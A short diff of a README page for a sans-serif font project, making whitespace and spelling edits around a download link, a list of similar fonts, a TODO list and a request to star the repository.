@@ -5,7 +5,7 @@ Unique original <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans fon
 <a href="https://github.com/qp5/FONT/raw/main/FONT.zip"><img style="height: 380px; margin-bottom:-0px; margin-top:0px;" src="https://bowhip.org/img/font_thumb_publisher.png" alt="mobile calling application"></a> 
 
 1 Sans Typeface — plus 2 bonus fonts.<br>
-  Fonts simular to this include:  Sego | Source Sans Pro | Open Sans<br><br>
+Fonts simular to this include:  Sego | Source Sans Pro | Open Sans<br><br>
 
 If you create fonts, please join this light project! <br><br>
   <b>TODO LIST</b><br> 
@@ -16,7 +16,7 @@ If you create fonts, please join this light project! <br><br>
     ￭  add to google fonts<br>
     <br>
     📫 Send <a href="mailto: support@bowhip.org">feedback</a> <br><br>
-    <b>Star ☆</b> this repository: See Button in <b>top right corner</b> to rate this Font.<br>
+    <b>Star ☆</b> this repository: See Button in <b>top rght corner</b> to rate this Font.<br>
     <b>Follow ଳ</b> this repository: Select <b>Watch</b> button at top of screen above.   <br><br>
     
 ____________________________________________________________
